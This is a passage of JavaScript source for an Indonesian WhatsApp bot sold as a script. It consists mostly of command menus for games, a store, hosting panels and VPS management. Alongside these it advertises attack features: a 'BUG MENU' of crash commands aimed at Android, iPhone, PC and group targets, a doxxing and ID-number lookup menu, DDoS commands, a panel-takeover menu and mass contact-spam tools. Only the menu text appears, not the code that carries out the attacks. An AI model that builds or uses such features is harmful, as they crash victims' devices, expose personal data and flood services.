┃ ${prefix}ban
┃ ${prefix}unban
┃ ${prefix}listban
┃ ${prefix}ceksrvr
┃ ${prefix}ssweb
┃ ${prefix}listpc
┃ ${prefix}chat
┃ ${prefix}tsrvr
┃ ${prefix}myip
┃ ${prefix}cekip
┃ ${prefix}nowa
┃ ${prefix}npms
┃ ${prefix}rget
┃ ${prefix}del
┃ ${prefix}enc
┗━━━━━━━━━━━━━━
┏━ ⊑ *GROUP  MENU* ⊒
┃ ${prefix}add
┃ ${prefix}kick
┃ ${prefix}linkgc
┃ ${prefix}revoke
┃ ${prefix}promote
┃ ${prefix}demote
┃ ${prefix}open
┃ ${prefix}close
┃ ${prefix}opentime
┃ ${prefix}closetime
┃ ${prefix}setsubjek
┃ ${prefix}setdesk
┃ ${prefix}setppgc
┃ ${prefix}delppgc
┃ ${prefix}getnamagc
┃ ${prefix}getdeskgc
┃ ${prefix}getppgc
┃ ${prefix}getname
┃ ${prefix}getpp
┃ ${prefix}infogc
┃ ${prefix}topglobal
┃ ${prefix}toplocal
┃ ${prefix}leavegc
┃ ${prefix}quoted
┃ ${prefix}antilink
┃ ${prefix}antilinkgc
┃ ${prefix}accmem
┃ ${prefix}mute
┗━━━━━━━━━━━━━━
┏━ ⊑ *GAMES  MENU* ⊒
┃ ${prefix}family100
┃ ${prefix}suitpvp
┃ ${prefix}tictactoe
┃ ${prefix}delttt
┃ ${prefix}petakbom
┃ ${prefix}delpetakbom
┃ ${prefix}casino
┃ ${prefix}delcasino
┃ ${prefix}werewolf
┃ ${prefix}wikwik
┃ ${prefix}ngojek
┃ ${prefix}tebakgambar
┃ ${prefix}tebakkalimat
┃ ${prefix}tebakkata
┃ ${prefix}tebaklirik
┃ ${prefix}tebakanime
┃ ${prefix}tebaklagu
┃ ${prefix}kuis
┃ ${prefix}tebakkimia
┃ ${prefix}tebakbendera
┃ ${prefix}siapakahaku
┃ ${prefix}asahotak
┃ ${prefix}susukata
┃ ${prefix}caklontong
┃ ${prefix}math
┃ ${prefix}tebakgame
┃ ${prefix}slot
┗━━━━━━━━━━━━━━
┏━ ⊑ *STORE  MENU* ⊒
┃ ${prefix}tambah
┃ ${prefix}kurang
┃ ${prefix}kali
┃ ${prefix}bagi
┃ ${prefix}buygold
┃ ${prefix}buysaldo
┃ ${prefix}buy1gb
┃ ${prefix}buy2gb
┃ ${prefix}buy3gb
┃ ${prefix}buy4gb
┃ ${prefix}buy5gb
┃ ${prefix}list
┃ ${prefix}addlist
┃ ${prefix}dellist
┃ ${prefix}updatelist
┗━━━━━━━━━━━━━━
┏━ ⊑ *BUG MENU* ⊒
┃ *BUG ANDROID*
┃ ${prefix}1hit *62XXX*
┃ ${prefix}sipilist *62XXX*
┃ ${prefix}mimir *62XXX*
┃ ${prefix}1shoot *62XXX*
┃ ${prefix}systemc1 *62XXX*
┃ ${prefix}rafasystem *62XXX*
┃ ${prefix}rafa1hit *62XXX*
┃ ${prefix}amalia1hit *62XXX*
┃ ${prefix}syva1hit *62XXX*
┃ ${prefix}amalia1shoot *62XXX*
┃ ${prefix}rafa1shoot *62XXX*
┃ 
┃ *BUG PC PRIBADI*
┃ ${prefix}alfixamalia-pc *TARGET*
┃ ${prefix}amalia-pc *TARGET*
┃ ${prefix}rafa-pc *TARGET*
┃ ${prefix}ripper-pc *TARGET*
┃ ${prefix}rip-pc *TARGET*
┃ ${prefix}php-pc *TARGET*
┃ 
┃ *BUG EMOJI*
┃ ${prefix}😎 *62XXX*
┃ ${prefix}🥵 *62XXX*
┃ ${prefix}☠️ *62XXX*
┃ ${prefix}🥶 *62XXX*
┃ ${prefix}😈 *62XXX*
┃ ${prefix}🌷 *62XXX* 
┃ ${prefix}😱 *62XXX*
┃ ${prefix}😡 *62XXX*
┃ ${prefix}🤢 *62XXX*
┃ ${prefix}💀 *62XXX*
┃ ${prefix}👻 *62XXX*
┃ ${prefix}💩 *62XXX*
┃ 
┃ *BUG WAKTU*
┃ ${prefix}rafagas *62878|waktu*
┃ ${prefix}rafaslebew *62878|waktu*
┃ 
┃ *BUG IPHONE*
┃ ${prefix}bug-ipong *62878#|waktu*
┃ ${prefix}bug-ios *62878#|waktu*
┃ 
┃ *BUG GROUP*
┃ ${prefix}rafabuggc *Link Group*
┃ ${prefix}rafagc *Link Group*
┃ ${prefix}rafaspmgc *Link Group*
┗━━━━━━━━━━━━━━
┏━ ⊑ *MENFES  MENU* ⊒
┃ ${prefix}anonymous
┃ ${prefix}start
┃ ${prefix}mulai
┃ ${prefix}leave
┃ ${prefix}keluar
┃ ${prefix}next
┃ ${prefix}lanjut
┃ ${prefix}confess
┃ ${prefix}menfess
┃ ${prefix}balasmenfess
┃ ${prefix}tolakmenfess
┃ ${prefix}stopmenfess
┗━━━━━━━━━━━━━━
┏━ ⊑ *INSTALL PANEL  MENU* ⊒
┃ ${prefix}installpanel
┃ ${prefix}uninstallpanel
┃ ${prefix}rinstallermenuv1 *Button*
┃ ${prefix}rinstallermenuv2 *Button/Otomatis*
┃ ${prefix}rinstallermenuv3 *Button/Salin*
┃ ${prefix}installthema
┃ ${prefix}uninstallthema
┃ ${prefix}createnode
┃ ${prefix}startwings 
┗━━━━━━━━━━━━━━
┏━ ⊑ *DOMAIN  MENU* ⊒
┃ ${prefix}listsubdomain
┃ ${prefix}subdomain
┃ ${prefix}delsubdo
┃ ${prefix}listpdomain
┃ ${prefix}adddomain
┃ ${prefix}deldomain
┗━━━━━━━━━━━━━━
┏━ ⊑ *SEWA BOT  MENU* ⊒
┃ ${prefix}creategc
┃ ${prefix}sewabot
┃ ${prefix}sewa
┗━━━━━━━━━━━━━━
┏━ ⊑ *UPDATE  MENU* ⊒
┃ ${prefix}upbashinstall
┃ ${prefix}upbashinstall1
┃ ${prefix}upbashinstall2
┃ ${prefix}uptokeninstall
┃ ${prefix}uptokeninstall1
┃ ${prefix}uptokeninstall2
┃ ${prefix}updomain
┃ ${prefix}updomain2
┃ ${prefix}upapikey
┃ ${prefix}upapikey2
┃ ${prefix}upcapikey
┃ ${prefix}upcapikey2
┃ ${prefix}uphargav1
┃ ${prefix}uphargav2
┃ ${prefix}uphargav3
┃ ${prefix}uphargav3up
┃ ${prefix}uphargapribadi
┃ ${prefix}uphargav3saweria
┃ ${prefix}upzone
┃ ${prefix}upapi
┗━━━━━━━━━━━━━━
┏━ ⊑ *BUY OTOMATIS  MENU* ⊒
┃ ${prefix}buysc-v1
┃ ${prefix}buysc-v2
┃ ${prefix}buysc-v3
┃ ${prefix}buysc-v3up
┃ ${prefix}buysc-pribadi
┃ ${prefix}depo-otomatis
┃ ${prefix}batal-membeli
┗━━━━━━━━━━━━━━
┏━ ⊑ *DOXXING  MENU* ⊒
┃ ${prefix}doxxing *Button*
┃ ${prefix}nikparser
┃ ${prefix}getnik
┃ ${prefix}dox
┗━━━━━━━━━━━━━━
┏━ ⊑ *KUDETA  MENU* ⊒
┃ ${prefix}kudetapanel
┃ ${prefix}kudetpanel
┃ ${prefix}btlkdtpanel
┃ ${prefix}hbpanel
┗━━━━━━━━━━━━━━
┏━ ⊑ *CPANEL V1 MENU* ⊒
┃ ${prefix}listserver
┃ ${prefix}delserver
┃ ${prefix}listuser
┃ ${prefix}deluser
┃ ${prefix}addadmin
┃ ${prefix}deladmin
┃ ${prefix}listadmin
┃ ${prefix}cadmin
┃ ${prefix}1gb
┃ ${prefix}2gb
┃ ${prefix}3gb
┃ ${prefix}4gb
┃ ${prefix}5gb
┃ ${prefix}6gb
┃ ${prefix}7gb
┃ ${prefix}8gb
┃ ${prefix}9gb
┃ ${prefix}10gb
┃ ${prefix}unli
┃ ${prefix}suspend
┃ ${prefix}unsuspend
┃ ${prefix}reinstall
┃ ${prefix}startsrv
┃ ${prefix}stopsrv
┃ ${prefix}restartsrv
┗━━━━━━━━━━━━━━
┏━ ⊑ *CPANEL V2 MENU* ⊒
┃ ${prefix}listserver-v2
┃ ${prefix}delserver-v2
┃ ${prefix}listuser-v2
┃ ${prefix}deluser-v2
┃ ${prefix}addadmin-v2
┃ ${prefix}deladmin-v2
┃ ${prefix}listadmin-v2
┃ ${prefix}cadmin-v2
┃ ${prefix}1gb-v2
┃ ${prefix}2gb-v2
┃ ${prefix}3gb-v2
┃ ${prefix}4gb-v2
┃ ${prefix}5gb-v2
┃ ${prefix}unli-v2
┗━━━━━━━━━━━━━━
┏━ ⊑ *BUY PANEL 1 OTOMATIS* ⊒
┃ ${prefix}b1gb
┃ ${prefix}b2gb
┃ ${prefix}b3gb
┃ ${prefix}b4gb
┃ ${prefix}b5gb
┃ ${prefix}bunli
┗━━━━━━━━━━━━━━
┏━ ⊑ *BUY PANEL 2 OTOMATIS* ⊒
┃ ${prefix}b1gb-v2
┃ ${prefix}b2gb-v2
┃ ${prefix}b3gb-v2
┃ ${prefix}b4gb-v2
┃ ${prefix}b5gb-v2
┃ ${prefix}bunli-v2
┗━━━━━━━━━━━━━━
┏━ ⊑ *DIGITAL  OCEAN* ⊒
┃ ${prefix}sisadroplet
┃ ${prefix}deldroplet
┃ ${prefix}cekdroplet
┃ ${prefix}listdroplet
┃ ${prefix}vps1g1c
┃ ${prefix}vps1g2c
┃ ${prefix}vps2g2c
┃ ${prefix}vps4g2c
┃ ${prefix}vps8g4c
┃ ${prefix}vps16g4c
┃ ${prefix}vps1g1c-v2 *Metode Salin*
┃ ${prefix}vps1g2c-v2 *Metode Salin*
┃ ${prefix}vps2g2c-v2 *Metode Salin*
┃ ${prefix}vps4g2c-v2 *Metode Salin*
┃ ${prefix}vps8g4c-v2 *Metode Salin*
┃ ${prefix}vps16g4c-v2 *Metode Salin*
┃ ${prefix}turnon
┃ ${prefix}turnoff
┃ ${prefix}cvpsubuntuv1 *otomati*
┃ ${prefix}cvpsubuntuv2 *otomati*
┃ ${prefix}changeapido
┃ ${prefix}restartvps
┃ ${prefix}resetpwvps
┃ ${prefix}rebuild
┃ ${prefix}sendvps
┃ ${prefix}cvps *otomatis*
┗━━━━━━━━━━━━━━
┏━ ⊑ *LINODE* ⊒
┃ ${prefix}resetpassword
┃ ${prefix}changeapilinode
┃ ${prefix}deletelinode
┃ ${prefix}listlinode
┃ ${prefix}onlinode
┃ ${prefix}offlinode
┃ ${prefix}rebootlinode
┃ ${prefix}rebuildlinode
┃ ${prefix}sisalinode
┃ ${prefix}saldolinode
┃ ${prefix}cekvpslinode
┃ ${prefix}linode2gb
┃ ${prefix}linode4gb
┃ ${prefix}linode8gb
┃ ${prefix}linode16gb
┗━━━━━━━━━━━━━━
┏━ ⊑ *NGEPUSH  MENU* ⊒
┃ ${prefix}pushkontak
┃ ${prefix}pushkontak2
┃ ${prefix}pushkontakid
┃ ${prefix}pushkontakgc
┃ ${prefix}pushkontakidjd
┃ ${prefix}pushkontakgcjd
┃ ${prefix}savecontact
┃ ${prefix}savecontact2
┃ ${prefix}save
┃ ${prefix}cekidgc
┗━━━━━━━━━━━━━━
┏━ ⊑ *PPOB  INDONESIA* ⊒
┃ ${prefix}topup-dana
┃ ${prefix}topup-gopay
┃ ${prefix}topup-ovo
┃ ${prefix}pulsa-axis
┃ ${prefix}pulsa-indosat
┃ ${prefix}pulsa-tsel
┃ ${prefix}pulsa-tri
┃ ${prefix}pulsa-xl
┃ ${prefix}tshopeepay
┗━━━━━━━━━━━━━━
┏━ ⊑ *DONLOD  MENU* ⊒
┃ ${prefix}mediafire
┃ ${prefix}tiktok
┃ ${prefix}tiktok-v2
┃ ${prefix}facebook
┃ ${prefix}instagram
┃ ${prefix}twitter
┃ ${prefix}capcut
┃ ${prefix}gdrive
┃ ${prefix}mega
┃ ${prefix}tinyurl
┃ ${prefix}happymod
┗━━━━━━━━━━━━━━
┏━ ⊑ *CHATAI  MENU* ⊒
┃ ${prefix}rafaai1
┃ ${prefix}rafaai2
┃ ${prefix}rafaai3
┃ ${prefix}rafaai4
┃ ${prefix}simi
┃ ${prefix}luminai
┃ ${prefix}min
┃ ${prefix}gptpro
┃ ${prefix}imgtext
┃ ${prefix}rafa
┃ ${prefix}bocchi
┃ ${prefix}lora
┗━━━━━━━━━━━━━━
┏━ ⊑ *SEARCH  MENU* ⊒
┃ ${prefix}google
┃ ${prefix}gimage
┃ ${prefix}ytsearch
┃ ${prefix}rafaplay
┃ ${prefix}play
┃ ${prefix}play-v2
┃ ${prefix}ytmp4
┃ ${prefix}ytmp4-v2
┃ ${prefix}ytmp3
┃ ${prefix}ytmp3-v2
┃ ${prefix}ttsearch
┃ ${prefix}ttget
┃ ${prefix}spotifys
┃ ${prefix}pin
┗━━━━━━━━━━━━━━
┏━ ⊑ *OTHERS  MENU* ⊒
┃ ${prefix}jadibot
┃ ${prefix}stopjadibot
┃ ${prefix}listjadibot
┃ ${prefix}ceknickff
┃ ${prefix}ceknickml
┃ ${prefix}hdimg
┃ ${prefix}hdvid
┃ ${prefix}tourl
┃ ${prefix}tourl-v2
┃ ${prefix}tourl-v3
┃ ${prefix}qcstik
┃ ${prefix}qckode
┃ ${prefix}stiker
┃ ${prefix}smeme
┃ ${prefix}swm
┃ ${prefix}gtts
┃ ${prefix}gtts2
┃ ${prefix}readvo
┃ ${prefix}bukavn
┃ ${prefix}infogempa
┃ ${prefix}getvideo
┃ ${prefix}getmusic
┃ ${prefix}cekkhodam
┗━━━━━━━━━━━━━━

RiiSTORE ID V 4.0.4Support Channel`
const beton = {
title: "DAFTAR",
sections: [
{
title: `Daftar menggunakan email`, 
highlight_label: ``,
rows: [
{
title: "EMAIL",
description: "Metode email v1",
id: `${prefix}emailcara`, 
},
]},
{
title: `Daftar menggunakan captcha`, 
highlight_label: ``,
rows: [
{
title: "CAPTCHA",
description: "Metode daftar v2",
id: `${prefix}regis -captcha`, 
},
]},
{
title: `Daftar secara otomatis`, 
highlight_label: ``,
rows: [
{
title: "OTOMATIS",
description: "Metode daftar v3",
id: `${prefix}regis -auto`, 
},
]},
]};

listbut(m.chat, teks, beton, m)
}
break

case 'mainmenu':
case 'mainmenu': {
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *MAIN MENU* ⊒
┃ ${prefix}regis
┃ ${prefix}unregis
┃ ${prefix}nickname
┃ ${prefix}infome
┃ ${prefix}infobot
┃ ${prefix}channe
┃ ${prefix}website 
┃ ${prefix}status
┃ ${prefix}script
┃ ${prefix}credit
┃ ${prefix}qris
┃ ${prefix}gold
┃ ${prefix}saldo
┃ ${prefix}vurl
┃ ${prefix}limit
┃ ${prefix}cekgold
┃ ${prefix}ceksaldo
┃ ${prefix}ceklimit
┃ ${prefix}info-cuaca
┃ ${prefix}listhargasc
┃ ${prefix}tfsaldo
┃ ${prefix}owner
┃ ${prefix}owner2
┃ ${prefix}ping
┃ ${prefix}runtime
┃ ${prefix}updatesc
┃ ${prefix}payment
┃ ${prefix}totalfitur
┃ ${prefix}report
┃ ${prefix}allpay
┃ ${prefix}reply
┃ ${prefix}reports
┃ ${prefix}delreports
┃ ${prefix}cekreports
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
Rafa1StickSc()
}
break

case 'ownermenu': {

rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *OWNER  MENU* ⊒
┃ ${prefix}addcase
┃ ${prefix}delcase
┃ ${prefix}getcase
┃ ${prefix}cekcase
┃ ${prefix}listcase
┃ ${prefix}addfunc
┃ ${prefix}delfunc
┃ ${prefix}getfunc
┃ ${prefix}cekfunc
┃ ${prefix}addlet
┃ ${prefix}dellet
┃ ${prefix}getlet
┃ ${prefix}addconst
┃ ${prefix}subfinder 
┃ ${prefix}getdep
┃ ${prefix}gantifile
┃ ${prefix}sendfitur
┃ ${prefix}backup
┃ ${prefix}getsession
┃ ${prefix}delsession
┃ ${prefix}ambilsc
┃ ${prefix}sendsc
┃ ${prefix}sendbyr
┃ ${prefix}sendutang
┃ ${prefix}addres
┃ ${prefix}delres
┃ ${prefix}listres
┃ ${prefix}addprem
┃ ${prefix}delprem
┃ ${prefix}listprem
┃ ${prefix}addreseller
┃ ${prefix}delreseller
┃ ${prefix}listreseller
┃ ${prefix}addreseller2
┃ ${prefix}delreseller2
┃ ${prefix}listreseller2
┃ ${prefix}addowner
┃ ${prefix}addowner2
┃ ${prefix}delowner
┃ ${prefix}listowner
┃ ${prefix}addgold
┃ ${prefix}mingold
┃ ${prefix}addsaldo
┃ ${prefix}minsaldo
┃ ${prefix}addlimit
┃ ${prefix}minlimit
┃ ${prefix}sampah
┃ ${prefix}delsampah
┃ ${prefix}delsampah2
┃ ${prefix}clearsesi
┃ ${prefix}ddos-hent
┃ ${prefix}ddos-mix
┃ ${prefix}getdb
┃ ${prefix}getfolder
┃ ${prefix}getfile
┃ ${prefix}getfile2
┃ ${prefix}getfile3
┃ ${prefix}addfolder
┃ ${prefix}addfile
┃ ${prefix}delfolder
┃ ${prefix}delfile
┃ ${prefix}jpmslide
┃ ${prefix}gcast
┃ ${prefix}bcgc
┃ ${prefix}bcimg
┃ ${prefix}bcvid
┃ ${prefix}adduserdb
┃ ${prefix}deluserdb
┃ ${prefix}hidetag
┃ ${prefix}block
┃ ${prefix}unblock
┃ ${prefix}listblock
┃ ${prefix}public
┃ ${prefix}self
┃ ${prefix}restart
┃ ${prefix}join
┃ ${prefix}totalmem
┃ ${prefix}cekasalmember
┃ ${prefix}cek-provider
┃ ${prefix}setnamabot
┃ ${prefix}setbiobot
┃ ${prefix}setppbot
┃ ${prefix}delppbot
┃ ${prefix}autotyping
┃ ${prefix}autoread
┃ ${prefix}autobio
┃ ${prefix}anticall
┃ ${prefix}antispam
┃ ${prefix}antibot
┃ ${prefix}ban
┃ ${prefix}unban
┃ ${prefix}listban
┃ ${prefix}ceksrvr
┃ ${prefix}ssweb
┃ ${prefix}listpc
┃ ${prefix}chat
┃ ${prefix}tsrvr
┃ ${prefix}myip
┃ ${prefix}cekip
┃ ${prefix}nowa
┃ ${prefix}npms
┃ ${prefix}rget
┃ ${prefix}del
┃ ${prefix}enc
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'groupmenu': {

rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *GROUP  MENU* ⊒
┃ ${prefix}add
┃ ${prefix}kick
┃ ${prefix}linkgc
┃ ${prefix}revoke
┃ ${prefix}promote
┃ ${prefix}demote
┃ ${prefix}open
┃ ${prefix}close
┃ ${prefix}opentime
┃ ${prefix}closetime
┃ ${prefix}setsubjek
┃ ${prefix}setdesk
┃ ${prefix}setppgc
┃ ${prefix}delppgc
┃ ${prefix}getnamagc
┃ ${prefix}getdeskgc
┃ ${prefix}getppgc
┃ ${prefix}getname
┃ ${prefix}getpp
┃ ${prefix}infogc
┃ ${prefix}topglobal
┃ ${prefix}toplocal
┃ ${prefix}leavegc
┃ ${prefix}quoted
┃ ${prefix}antilink
┃ ${prefix}antilinkgc
┃ ${prefix}accmem
┃ ${prefix}mute
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'gamesmenu': {
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *GAMES  MENU* ⊒
┃ ${prefix}family100
┃ ${prefix}suitpvp
┃ ${prefix}tictactoe
┃ ${prefix}delttt
┃ ${prefix}petakbom
┃ ${prefix}delpetakbom
┃ ${prefix}casino
┃ ${prefix}delcasino
┃ ${prefix}werewolf
┃ ${prefix}wikwik
┃ ${prefix}ngojek
┃ ${prefix}tebakgambar
┃ ${prefix}tebakkalimat
┃ ${prefix}tebakkata
┃ ${prefix}tebaklirik
┃ ${prefix}tebakanime
┃ ${prefix}tebaklagu
┃ ${prefix}kuis
┃ ${prefix}tebakkimia
┃ ${prefix}tebakbendera
┃ ${prefix}siapakahaku
┃ ${prefix}asahotak
┃ ${prefix}susukata
┃ ${prefix}caklontong
┃ ${prefix}math
┃ ${prefix}tebakgame
┃ ${prefix}slot
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'storemenu': {
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *STORE  MENU* ⊒
┃ ${prefix}tambah
┃ ${prefix}kurang
┃ ${prefix}kali
┃ ${prefix}bagi
┃ ${prefix}buygold
┃ ${prefix}buysaldo
┃ ${prefix}buy1gb
┃ ${prefix}buy2gb
┃ ${prefix}buy3gb
┃ ${prefix}buy4gb
┃ ${prefix}buy5gb
┃ ${prefix}done
┃ ${prefix}list
┃ ${prefix}addlist
┃ ${prefix}dellist
┃ ${prefix}updatelist
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'bugmenu': {
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *BUG MENU* ⊒
┃ *BUG ANDROID*
┃ ${prefix}1hit *62XXX*
┃ ${prefix}sipilist *62XXX*
┃ ${prefix}mimir *62XXX*
┃ ${prefix}1shoot *62XXX*
┃ ${prefix}systemc1 *62XXX*
┃ ${prefix}rafasystem *62XXX*
┃ ${prefix}rafa1hit *62XXX*
┃ ${prefix}amalia1hit *62XXX*
┃ ${prefix}syva1hit *62XXX*
┃ ${prefix}amalia1shoot *62XXX*
┃ ${prefix}rafa1shoot *62XXX*
┃ ┃ 
┃ *BUG PC PRIBADI*
┃ ${prefix}alfixamalia-pc *TARGET*
┃ ${prefix}amalia-pc *TARGET*
┃ ${prefix}rafa-pc *TARGET*
┃ ${prefix}ripper-pc *TARGET*
┃ ${prefix}rip-pc *TARGET*
┃ ${prefix}php-pc *TARGET*
┃
┃ *BUG EMOJI*
┃ ${prefix}😎 *62XXX*
┃ ${prefix}🥵 *62XXX*
┃ ${prefix}☠️ *62XXX*
┃ ${prefix}🥶 *62XXX*
┃ ${prefix}😈 *62XXX*
┃ ${prefix}🌷 *62XXX*
┃ ${prefix}😱 *62XXX*
┃ ${prefix}😡 *62XXX*
┃ ${prefix}🤢 *62XXX*
┃ ${prefix}💀 *62XXX*
┃ ${prefix}👻 *62XXX*
┃ ${prefix}💩 *62XXX*
┃ 
┃ *BUG WAKTU*
┃ ${prefix}rafagas *62878|waktu*
┃ ${prefix}rafaslebew *62878|waktu*
┃ 
┃ *BUG IPHONE*
┃ ${prefix}bug-ipong *62878#|waktu*
┃ ${prefix}bug-ios *62878#|waktu*
┃ 
┃ *BUG GROUP*
┃ ${prefix}rafabuggc *Link Group*
┃ ${prefix}rafagc *Link Group*
┃ ${prefix}rafaspmgc *Link Group*
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'menfesmenu': {
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *MENFES  MENU* ⊒
┃ ${prefix}anonymous
┃ ${prefix}start
┃ ${prefix}mulai
┃ ${prefix}leave
┃ ${prefix}keluar
┃ ${prefix}next
┃ ${prefix}lanjut
┃ ${prefix}confess
┃ ${prefix}menfess
┃ ${prefix}balasmenfess
┃ ${prefix}tolakmenfess
┃ ${prefix}stopmenfess
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'domainmenu': {
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *DOMAIN  MENU* ⊒
┃ ${prefix}listsubdomain
┃ ${prefix}subdomain
┃ ${prefix}delsubdo
┃ ${prefix}listpdomain
┃ ${prefix}adddomain
┃ ${prefix}deldomain
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'sewabotmenu': {
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *SEWA BOT  MENU* ⊒
┃ ${prefix}creategc
┃ ${prefix}sewabot
┃ ${prefix}sewa
┗━━━━━━━━━━━━━━
*NOTE : SEWA BOT INI ADA RULES NYA!!*
*RULES SEWABOT :*

*1. DILARANG KERAS SPAM BOT!*
*2. DILARANG MENAMBAH BOT KE DALAM GRUP!!*
*3. DILARANG CHAT DI PRIBADI!!*`
sendbutton(m.chat, teks, m)
}
break

case 'tbashmenu': {
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *TBASH  MENU* ⊒
┃ ${prefix}tbash1
┃ ${prefix}tbash2
┗━━━━━━━━━━━━━━
*NOTE : DIATAS TOKEN DAN BASH YG DIJUAL!!*`
sendbutton(m.chat, teks, m)
}
break

case 'website': case 'web': case 'w': {
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `⊑ *WEBSITE KAMI* ⊒
${global.website}
*WEBSITE RESMI DARI KAMI.*`
sendbutton(m.chat, teks, m)
}
break

case 'status': {
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `ꆜ *Profil* : ${db.data.users[m.sender].daftar ? 'Sudah terdaftar' : 'Belum terdaftar'}
ꆜ *Status* : ${isOwner ? 'Owner' : isPremium ? 'Premium' : isReseller ? 'Reseller' : isReseller2 ? 'Reseller2' : isOwner2 ? 'Owner2' : 'User'}`
sendbutton(m.chat, teks, m)
}
break

case 'listhargasc': {
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *LIST HARGA SCRIPT* ⊒
┃HARGA V1 :
┃Rp. : ${global.rbuyscv1} 
┃Contoh : .buysc-v1
┃ 
┃HARGA V2 :
┃Rp. : ${global.rbuyscv2} 
┃Contoh : .buysc-v2
┃ 
┃HARGA V3 :
┃Rp. : ${global.rbuyscv3}
┃Contoh : .buysc-v3
┃ 
┃HARGA V3 UP :
┃Rp. : ${global.rbuyscv3up}
┃Contoh : .buysc-v3up
┃ 
┃HARGA V3 SAWERIA :
┃Rp. : ${global.rbuyscv3saweria}
┃Contoh : .buysc-v3saweria
┃
┃HARGA PRIBADI :
┃Rp. : ${global.rbuyscprib}
┃Contoh : .buysc-pribadi
┗━━━━━━━━━━━━━━
*UNTUK MELAKUKAN BUY OTOMATIS IKUTI CONTOH YANG DIATAS🙏*
`
sendbutton(m.chat, teks, m)
}
break

case 'sramlist1': {
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *RAM YANG TERSEDIA* ⊒

┃1GB 
┃2GB 
┃3GB
┃4GB 
┃5GB 
┃6GB 
┃7GB 
┃8GB 
┃9GB 
┃10GB
┃UNLI 
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'sramlist2': case 'sramlist-v2': {
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *RAM YANG TERSEDIA* ⊒

┃1GB 
┃2GB 
┃3GB
┃4GB 
┃5GB 
┃UNLI 
┗━━━━━━━━━━━━━━`
sendbutton(m.chat, teks, m)
}
break

case 'token-bashnew': {
if (!isOwner) return onlyOwn()
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `⊑ *TOKEN & BASH* ⊒

*BASH INSTALL NEW :*
*${global.bash}*
*TOKEN ALL INSTALL NEW:*
*${global.tokeninstall}*

*TER UPDATE DARI :*
*${penghitung}*
*PUKUL :*
*${jam}*
`
sendbutton(m.chat, teks, m)
}
break

case 'tbash1': {
if (!isOwner) return onlyOwn()
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `⊑ *TOKEN & BASH 1* ⊒

*BASH INSTALL 1 :*
*${global.bash1}*
*TOKEN ALL INSTALL 1 :*
*${global.tokeninstall1}*

*TER UPDATE DARI :*
*${penghitung}*
*PUKUL :*
*${jam}*
`
sendbutton(m.chat, teks, m)
}
break

case 'tbash1-v2': {
if (!isOwner) return onlyOwn()
var teks = `⊑ *TOKEN & BASH 1* ⊒

*BASH INSTALL 1 :*
*${global.bash}*

*TOKEN ALL INSTALL 1 :*
*${global.tokeninstall}*

*TER UPDATE DARI :*
*${penghitung}*
*PUKUL :*
*${jam}*
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}),
header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${m.sender.split("@")[0]} 👋*`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b16b6163e621449bdcecb.jpg" } }, { upload: rafatharcode.waUploadToServer }))
 }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Bash\",\"id\":\"123456789\",\"copy_code\":\"${global.bash}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Token\",\"id\":\"123456789\",\"copy_code\":\"${global.tokeninstall}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'tbash2': {
if (!isOwner) return onlyOwn()
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `⊑ *TOKEN & BASH 2* ⊒

*BASH INSTALL 2 :*
*${global.bash2}*
*TOKEN ALL INSTALL 2 :*
*${global.tokeninstall2}*

*TER UPDATE DARI :*
*${penghitung}*
*PUKUL :*
*${jam}*
`
sendbutton(m.chat, teks, m)
}
break

case 'tbash2-v2': {
